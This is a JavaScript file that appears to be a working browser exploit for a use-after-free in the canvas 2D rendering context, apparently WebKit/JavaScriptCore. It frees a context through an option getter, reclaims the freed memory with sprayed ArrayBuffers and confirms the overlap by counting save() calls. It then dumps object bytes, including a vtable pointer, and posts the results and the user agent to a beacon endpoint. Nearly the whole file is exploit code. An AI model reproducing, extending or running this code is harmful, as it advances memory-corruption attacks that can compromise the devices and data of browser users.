// p467-canvas-minimal-spray.js — Canvas UAF + AB reclaim without GC crash
//
// ROOT CAUSE of all prior crashes:
// visitAdditionalChildren() reads wrapped().canvas() → m_canvas at offset +32.
// After AB reclaim, offset +32 = 0 → null deref. This happens in JSC's concurrent
// GC marker thread, which can visit innerCtx at any time during allocation.
//
// FIX: Force GC to complete BEFORE UAF, pre-fill 768 size class, then use minimal
// post-UAF allocations (< eden threshold) so no new GC cycle starts.
//
// Layout: CanvasRenderingContext2D ~712 bytes → 768 size class
// m_unrealizedSaveCount at offset +592, m_canvas at +32, vtable at +0
(function() {
  var RUN = 'p467-' + Date.now().toString(36);
  var LOG = []; // collect all results, send at end

  function L(tag, data) {
    LOG.push(tag + '|' + (typeof data === 'object' ? JSON.stringify(data) : (data || '')));
  }

  function flushBeacons() {
    for (var i = 0; i < LOG.length; i++) {
      try {
        var parts = LOG[i].split('|');
        var x = new XMLHttpRequest();
        x.open('POST', '/beacon/' + parts[0] + '/' + RUN, false);
        x.send(parts.slice(1).join('|'));
      } catch(e) {}
    }
  }

  // Send boot beacon immediately (safe — no UAF yet)
  try {
    var x = new XMLHttpRequest();
    x.open('POST', '/beacon/BOOT/' + RUN, false);
    x.send(navigator.userAgent);
  } catch(e) {}

  // ========== PHASE 0: Force GC completion ==========
  // Allocate and discard many objects to trigger GC, then let it complete.
  // After this, eden is near-empty — we have a full budget before next cycle.
  var gcTrash = [];
  for (var i = 0; i < 50000; i++) gcTrash.push({ v: i });
  gcTrash = null; // discard all refs
  // Tight loop to give GC time to complete (concurrent marker)
  var sum = 0;
  for (var i = 0; i < 1000000; i++) sum += i;
  L('GC-CLEAR', 'sum=' + sum);

  // ========== PHASE 1: Pre-fill 768 size class ==========
  // Fill existing free slots so the freed context will be the ONLY free slot.
  var prefill = new Array(300);
  for (var i = 0; i < 300; i++) prefill[i] = new ArrayBuffer(768);
  L('PREFILL', 300);

  // ========== PHASE 2: Trigger UAF ==========
  var c = document.createElement('canvas');
  c.width = 1; c.height = 1;
  document.body.appendChild(c);
  var inner = null, tc = 0;
  var settings = {};
  Object.defineProperty(settings, 'desynchronized', {
    get: function() { tc++; if (tc === 1) inner = c.getContext('2d'); return false; }
  });
  var outer = c.getContext('2d', settings);

  if (!inner || inner === outer) {
    L('SKIP', 'no-uaf');
    flushBeacons();
    return;
  }
  L('UAF', 'ok');

  // ========== PHASE 3: save() marker (BEFORE AB spray) ==========
  // Freed slot still has valid m_canvas → GC safe.
  // save() writes to offset +592 of freed slot (still mapped, not zeroed by libpas).
  var MARKER = 42;
  try {
    for (var i = 0; i < MARKER; i++) inner.save();
    L('PRESAVE', 'ok=' + MARKER);
  } catch(e) {
    L('PRESAVE-ERR', e.constructor.name + ':' + e.message.slice(0,80));
    flushBeacons();
    return;
  }

  // ========== PHASE 4: Minimal AB spray ==========
  // Only 30 ABs of 768 bytes. These reclaim the freed slot.
  // fastCalloc ZEROES the reclaimed slot → save marker is wiped.
  // Total GC allocation: ~30 × 64 = 1.9KB (well below eden threshold).
  var spray = new Array(30);
  for (var i = 0; i < 30; i++) spray[i] = new ArrayBuffer(768);

  // ========== PHASE 5: save() AGAIN (writes to AB if reclaimed) ==========
  var MARKER2 = 77;
  try {
    for (var i = 0; i < MARKER2; i++) inner.save();
    L('POSTSAVE', 'ok=' + MARKER2);
  } catch(e) {
    L('POSTSAVE-ERR', e.constructor.name + ':' + e.message.slice(0,80));
    // If save() crashes here, the slot wasn't reclaimed by AB (or was reclaimed and
    // has zeroed m_stateStack pointer → realizeSaves crashes). But save() doesn't
    // call realizeSaves! It just increments. This shouldn't crash.
    // If it DOES crash: something else wrong.
  }

  // ========== PHASE 6: Scan ABs ==========
  // The total m_unrealizedSaveCount should be MARKER + MARKER2 = 42 + 77 = 119
  // But if calloc zeroed offset 592 between the two save() calls, it's just 77.
  var TARGET1 = MARKER + MARKER2; // 119 — if slot wasn't reclaimed between saves
  var TARGET2 = MARKER2;          // 77  — if calloc zeroed then save wrote fresh

  var views = new Array(30);
  for (var i = 0; i < 30; i++) views[i] = new Uint32Array(spray[i]);

  var hitIdx = -1, hitOff = -1, hitVal = 0;
  for (var i = 0; i < 30; i++) {
    var v = views[i];
    // Check known offset first: 592 / 4 = 148
    if (v[148] === TARGET1 || v[148] === TARGET2 || v[148] === MARKER) {
      hitIdx = i; hitOff = 148; hitVal = v[148]; break;
    }
    // Scan all offsets
    for (var j = 100; j < v.length; j++) {
      if (v[j] === TARGET1 || v[j] === TARGET2 || v[j] === MARKER) {
        hitIdx = i; hitOff = j; hitVal = v[j]; break;
      }
    }
    if (hitIdx >= 0) break;
  }

  if (hitIdx >= 0) {
    L('HIT', JSON.stringify({ idx: hitIdx, byteOff: hitOff * 4, val: hitVal }));

    // Confirm: save one more, check if value increments
    try {
      inner.save();
      var newVal = views[hitIdx][hitOff];
      L('CONFIRM', JSON.stringify({ expected: hitVal + 1, actual: newVal, ok: newVal === hitVal + 1 }));
    } catch(e) {
      L('CONFIRM-ERR', e.message.slice(0,80));
    }

    // Dump bytes: vtable at +0, m_canvas at +32, m_stateStack at +112
    var u8 = new Uint8Array(spray[hitIdx]);
    var dump = '';
    for (var i = 0; i < 256; i++) dump += ('0' + u8[i].toString(16)).slice(-2);
    L('DUMP0', dump);
    dump = '';
    for (var i = 256; i < 512; i++) dump += ('0' + u8[i].toString(16)).slice(-2);
    L('DUMP1', dump);
    dump = '';
    for (var i = 512; i < 768; i++) dump += ('0' + u8[i].toString(16)).slice(-2);
    L('DUMP2', dump);
  } else {
    L('MISS768', 'no marker at 768');

    // ========== FALLBACK: Try other sizes ==========
    // Maybe the context isn't in the 768 size class. Try 720, 736, 800, 832.
    var altSizes = [704, 720, 736, 800, 832, 864, 896];
    for (var si = 0; si < altSizes.length; si++) {
      var sz = altSizes[si];
      var c2 = document.createElement('canvas');
      c2.width = 1; c2.height = 1;
      document.body.appendChild(c2);
      var inner2 = null, tc2 = 0;
      var s2 = {};
      Object.defineProperty(s2, 'desynchronized', {
        get: function() { tc2++; if (tc2 === 1) inner2 = c2.getContext('2d'); return false; }
      });
      c2.getContext('2d', s2);
      if (!inner2) continue;

      var M = 63;
      try { for (var k = 0; k < M; k++) inner2.save(); } catch(e) { continue; }

      // Spray 30 ABs at this size
      var alt = new Array(30);
      for (var j = 0; j < 30; j++) alt[j] = new ArrayBuffer(sz);

      // Post-save
      var M2 = 44;
      try { for (var k = 0; k < M2; k++) inner2.save(); } catch(e) {}

      // Scan
      var found = false;
      for (var j = 0; j < 30; j++) {
        var v = new Uint32Array(alt[j]);
        for (var off = 0; off < v.length; off++) {
          if (v[off] === M2 || v[off] === M + M2 || v[off] === M) {
            L('ALT-HIT', JSON.stringify({ size: sz, byteOff: off * 4, val: v[off] }));
            // Confirm
            try {
              inner2.save();
              var nv = new Uint32Array(alt[j])[off];
              L('ALT-CONFIRM', JSON.stringify({ size: sz, expected: v[off] + 1, actual: nv }));
            } catch(e) {}
            // Dump first 128 bytes
            var u8a = new Uint8Array(alt[j]);
            var dmp = '';
            for (var di = 0; di < Math.min(128, u8a.length); di++) dmp += ('0' + u8a[di].toString(16)).slice(-2);
            L('ALT-DUMP', dmp);
            found = true;
            break;
          }
        }
        if (found) break;
      }
      if (!found) {
        L('ALT-MISS', sz);
      }
      if (found) break;
    }
  }

  L('ALIVE', 'done');

  // ========== Flush all results as beacons ==========
  flushBeacons();
})();
